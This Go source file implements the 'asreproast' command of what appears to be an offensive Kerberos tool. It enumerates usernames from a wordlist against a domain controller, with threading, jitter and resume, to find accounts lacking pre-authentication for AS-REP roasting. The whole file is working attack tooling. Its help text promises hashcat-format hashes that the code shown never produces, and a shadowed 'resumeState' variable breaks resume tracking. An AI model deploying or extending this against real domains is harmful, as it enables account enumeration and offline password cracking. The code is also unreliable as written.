package cmd

import (
	"bufio"
	"fmt"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/incogbyte/gokbt/util"
	"github.com/spf13/cobra"
)

var asrepRoastCmd = &cobra.Command{
	Use:   "asreproast [flags] <username_wordlist>",
	Short: "Find users without Kerberos pre-authentication and dump AS-REP hashes",
	Long: `Will enumerate usernames from a list and identify those that do not require Kerberos pre-authentication.
For users without pre-auth, it will dump the AS-REP hash in hashcat format for offline cracking.
This is useful for AS-REP roasting attacks.
If no domain controller is specified, the tool will attempt to look one up via DNS SRV records.
A full domain is required.`,
	Args:   cobra.ExactArgs(1),
	PreRun: setupSession,
	Run:    asrepRoast,
}

func init() {
	asrepRoastCmd.Flags().StringVar(&outputValidFile, "output-valid", "", "File to save usernames without pre-auth")
	rootCmd.AddCommand(asrepRoastCmd)
}

func asrepRoast(cmd *cobra.Command, args []string) {
	usernamelist := args[0]
	usersChan := make(chan string, threads)
	defer cancel()

	var total, blanks, invalid, deduped int
	seen := make(map[string]struct{})
	var noPreAuthCount int32

	var wg sync.WaitGroup
	wg.Add(threads)

	var scanner *bufio.Scanner
	if usernamelist != "-" {
		file, err := os.Open(usernamelist)
		if err != nil {
			logger.Log.Error(err.Error())
			return
		}
		defer file.Close()
		scanner = bufio.NewScanner(file)
	} else {
		scanner = bufio.NewScanner(os.Stdin)
	}

	validOut, err := util.NewValidOutputFile(outputValidFile)
	if err != nil {
		logger.Log.Errorf("Failed to open output file: %v", err)
		return
	}
	if validOut != nil {
		defer validOut.Close()
	}

	var lineCount int64
	if showProgress && usernamelist != "-" {
		lineCount, _ = util.CountLines(usernamelist)
	}
	progress := util.NewProgressBar(lineCount, showProgress && lineCount > 0, "AS-REP Roast")
	progress.Start()

	for i := 0; i < threads; i++ {
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case username, ok := <-usersChan:
					if !ok {
						return
					}
					testAsrepRoast(username, &noPreAuthCount, validOut, progress)
				}
			}
		}()
	}

	start := time.Now()

	var resumeState *util.ResumeState
	if resumeFile != "" {
		if rs, err := util.LoadResumeState(resumeFile); err == nil {
			resumeState = rs
			logger.Log.Infof("Resuming from %s, skipping %d already processed", resumeFile, len(rs.Processed))
		} else {
			resumeState = util.NewResumeState(resumeFile, "asreproast", usernamelist)
		}
	}

	go func() {
		defer close(usersChan)
		lineNum := 0
		for scanner.Scan() {
			lineNum++
			total++
			usernameline := scanner.Text()
			if strings.TrimSpace(usernameline) == "" {
				blanks++
				continue
			}
			username, err := util.FormatUsername(usernameline)
			if err != nil {
				logger.Log.Debugf("[!] %q - %v", usernameline, err.Error())
				invalid++
				continue
			}
			if _, ok := seen[username]; ok {
				deduped++
				continue
			}
			seen[username] = struct{}{}

			if resumeState != nil && resumeState.IsProcessed(username) {
				continue
			}

			time.Sleep(util.JitterDelay(delay, jitter))
			select {
			case usersChan <- username:
			case <-ctx.Done():
				return
			}
		}
		if err := scanner.Err(); err != nil {
			logger.Log.Errorf("Error reading file: %s", err.Error())
		}
	}()

	wg.Wait()
	progress.Stop()

	if resumeState != nil {
		if err := resumeState.Save(); err != nil {
			logger.Log.Errorf("Failed to save resume state: %v", err)
		}
	}

	finalCount := atomic.LoadInt32(&counter)
	noPreAuth := atomic.LoadInt32(&noPreAuthCount)
	logger.Log.Infof("Done! Tested %d usernames in %.3f seconds", finalCount, time.Since(start).Seconds())
	logger.Log.Noticef("[*] Found %d users without pre-authentication", noPreAuth)
	logger.Log.Infof("Input stats: total=%d blanks=%d invalid=%d deduped=%d sent=%d", total, blanks, invalid, deduped, len(seen))

	if err := kSession.Close(); err != nil {
		logger.Log.Errorf("Error closing session: %s", err.Error())
	}
}

func testAsrepRoast(username string, noPreAuthCount *int32, validOut *util.ValidOutputFile, progress *util.ProgressBar) {
	atomic.AddInt32(&counter, 1)
	progress.Increment()
	
	usernamefull := fmt.Sprintf("%v@%v", username, domain)
	
	valid, err := kSession.TestUsername(username)
	
	if valid && err == nil {
		atomic.AddInt32(noPreAuthCount, 1)
		progress.IncrementSuccess()
		
		if validOut != nil {
			validOut.Write(usernamefull)
		}
		
		if resumeState != nil {
			resumeState.AddSuccess(usernamefull)
			resumeState.MarkProcessed(username)
		}
		
		if stopOnSuccess {
			safeCancel()
		}
	} else if err != nil {
		ok, errorString := kSession.HandleKerbError(err)
		if !ok {
			logger.Log.Errorf("[!] %v - %v", usernamefull, errorString)
			safeCancel()
		} else {
			logger.Log.Debugf("[!] %v - %v", usernamefull, errorString)
		}
		
		if resumeState != nil {
			resumeState.MarkProcessed(username)
		}
	}
}

var resumeState *util.ResumeState

